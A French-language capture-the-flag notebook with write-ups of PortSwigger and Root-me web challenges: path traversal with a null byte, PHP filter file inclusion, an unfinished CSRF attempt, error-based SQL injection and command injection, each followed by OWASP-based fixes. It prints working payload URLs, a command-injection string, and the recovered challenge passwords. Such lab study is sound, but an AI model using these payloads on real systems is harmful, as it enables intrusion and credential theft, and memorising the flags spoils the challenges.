# Challenges

## Portswigger | [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

### Étapes :

- Intercepter la requête qui récupère l'image d'un produit
- Tester le path traversal classique en modifiant la valeur du filename -> bad request "no such file" parce que le serveur vérifie l'extension
- Tester le path traversal en utilisant le null byte suivi d'une extension acceptée par le server -> la réponse de la requête contient le contenu du fichier etc/passwd

### Recommandations :

- **Références :**

  - https://owasp.org/www-community/attacks/Path_Traversal
  - https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack

- Essayer d'éviter dans la mesure du possible la récupération de fichiers avec une saisie accessible par l'utilisateur
- Si jamais cela ne peut pas être éviter, mettre en place une whitelist pour les fichiers récupérables de cette manière
- Vérifier que l'input ne contienne pas de chaîne de caractères à risque -> assainir la saisie de l'utilisateur
- Utiliser des index plutôt que des noms de fichier/emplacement de fichier pour les récupérer

## Root-me | [PHP Filter](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters)

### Étapes :

- L'URL du challenge contient un paramètre qui charge des fichiers : http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php
- Utilisation d'un PHP Filter pour récupérer le contenu du fichier login.php : http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
- Le fichier login.php contient un include d'un fichier config.php on récupère son contenu de la même manière que le fichier login : http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
- Le fichier config.php contient le password en clair : "DAPt9D2mky0APAF"

### Recommandations :

- **Références** :

  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion

- Essayer d'éviter dans la mesure du possible l'inclusion de fichier avec une saisie accessible par l'utilisateur
- Si jamais on ne peut pas éviter l'inclusion, il faut absolument mettre en place une white liste contenant tous les fichiers autorisés à être inclus et refuser les requêtes des fichiers n'étant pas dans cette liste.

## Root-me | [CSRF Contournement de jeton](http://challenge01.root-me.org/web-client/ch23/)

### Étapes :

- Se connecter
- Inspection du formulaire d'update du profile : en regardant dans le code source du form, on remarque qu'il y a un input caché contenant le token CSRF, la checkbox permettant de passer le compte en vérifié est disabled côté HTML et on a l'action du formulaire.
- Différents tests en interceptant la reqûete de l'update profile et de modifier le payload avec burpsuite
  - Ajouter un champ status à true -> message "You're not an admin" en réponse
  - Enlever le champ token et ajouter un champ status à true -> message "You're not an admin" en réponse
  - Utilisation de la valeur du token présent dans le formulaire de contact à la place du token du formulaire d'update -> message "You're not an admin" en réponse
    /!\ pas fini /!\

### Recommandations :

## Root-me | [SQL injection - Error](https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error?lang=fr)

### Étapes :

- Différents tests pour essayer de faire des injections sql via les champs de formulaire -> peu importe la syntaxe testée le formulaire renvoie toujours l'erreur : login failed
- En inspectant la réponse des requêtes on remarque que le lien de la page contents contient comme paramètres order=ASC
- Test de faire l'injection sql directement via l'URL :
  - http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
  - Avec ceci on obtient l'erreur ce qui veut dire que l'injection est possible via l'url :
- Essayer d'obtenir la liste des tables avec l'injection suivante : http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,(SELECT%20CAST(table_name%20AS%20int)%20FROM%20information_schema.tables%20LIMIT%201)
  - On obtient comme réponse : ERROR: invalid input syntax for integer: "m3mbr35t4bl3", on en déduit que le nom de la table est "m3mbr35t4bl3"7
- Récupération des différentes colonnes de la table : http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,(SELECT%20CAST(array_to_string(array_agg(column_name::text),%27,%27)%20AS%20int)%20FROM%20information_schema.columns%20WHERE%20table_name=$$m3mbr35t4bl3$$)
  - id, us3rn4m3_c0l, p455w0rd_c0l, em41l_c0l
- Récupération de la liste des combinaisons username, password : http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,(SELECT CAST(us3rn4m3_c0l||$$:$$||p455w0rd_c0l AS int) FROM m3mbr35t4bl3 LIMIT 1)
  - Erreur reçu en réponse : ERROR: invalid input syntax for integer: "admin:1a2BdKT5DIx3qxQN3UaC"

### Recommandations :

- **Références :**

  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

- Éviter de mettre directement les valeurs saisies par l'utilisateur dans les requêtes SQL et utiliser plutôt des requêtes préparées.
- Mettre en place une whiteliste pour les saisies utilisateur si possible
- Éviter d'afficher les messages d'erreur SQL détaillés pour limiter la divulgation d'informations sur la structure de la base de données.

## Root-me | [Injection de commande - Contournement de filtre](https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre)

### Étapes :

- Tests de différentes syntaxes pour injecter d'autres commandes dans le formulaire du ping
  - Certains essais donnaient une syntax error
  - Syntaxe pour bypass le filtre trouvée : 127.0.0.1' && cat index.php && '
- La requête ne donne aucune autre réponse que ping ok même avec un echo simple
- Récupérer directement le contenu du fichier index.php via une commande curl à la place d'essayer de l'afficher sur la page
- On remarque que le mot de passe est contenu dans un fichier .passwd
- Récupérer le fichier avec le mot de passe de la même manière que le fichier index.php

### Recommandations :

- **Références :**

  - https://owasp.org/www-community/attacks/Command_Injection

- Éviter de mettre directement la saisie utilisateur dans la commande
- Assainir la donnée saisie par l'utilisateur

## Root-me | [JWT - Jeton révoqué](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)

### Étapes :
